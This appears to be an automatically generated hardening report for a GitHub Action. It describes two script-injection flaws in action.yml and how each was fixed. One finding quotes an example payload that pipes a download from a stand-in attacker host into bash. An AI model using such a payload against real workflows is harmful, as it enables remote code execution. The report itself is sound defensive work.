<!-- markdownlint-disable -->

# Hardening Report: JeongJaeSoon--agent-guard/v3.4.4

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **JeongJaeSoon--agent-guard/v3.4.4** was hardened automatically. 2 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (b) violation in the 'Install gitleaks if missing' step: the shell variable `version` is assigned from `$AGENT_GUARD_GITLEAKS_VERSION` (which holds `inputs.gitleaks-version`) and then interpolated inside double-quoted strings: `archive="gitleaks_${version}_${os}_${arch}.tar.gz"` and `url="https://github.com/gitleaks/gitleaks/releases/download/v${version}/${archive}"`. Inside double quotes, bash still evaluates `$(...)` and backtick command substitutions, so a caller-supplied value such as `$(curl attacker.com|bash)` would be executed. The variable is not sanitized before use.

Locations:

- `action.yml:62`
- `action.yml:63`

### script-injection (severity: high)

Rule (b) violation in the 'Run Agent Guard' step: the shell variable `$AGENT_GUARD_PATHS` (sourced from `inputs.paths` via the step's `env:` block) is intentionally used **unquoted** in the final command: `"${GITHUB_ACTION_PATH}/plugins/agent-guard/bin/agent-guard" scan-path -- $AGENT_GUARD_PATHS`. While the comment explains this is to allow whitespace-splitting of multiple paths, the absence of quoting also allows an attacker-controlled `paths` input to inject shell metacharacters (`;`, `|`, `&`, `$(...)`, etc.), enabling arbitrary command execution. A `# shellcheck disable=SC2086` comment is present, confirming the unquoted expansion.

Locations:

- `action.yml:95`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection

**Notes:**

Fixed two script-injection findings in hardened/action/action.yml:
1. 'Install gitleaks if missing' step (lines 62-63): Added a case statement to validate that the gitleaks version string only contains safe characters [0-9A-Za-z._-], preventing command substitution injection when the version is interpolated into the archive filename and URL.
2. 'Run Agent Guard' step (line 95): Replaced the unquoted $AGENT_GUARD_PATHS expansion with xargs-based tokenization into a bash array (using the if-guard + printf | xargs printf '%s\0' + while-read-d-NUL pattern), then expanded as "${paths[@]}" to keep each path as a separate quoted argument, preventing shell metacharacter injection while preserving multi-path support.

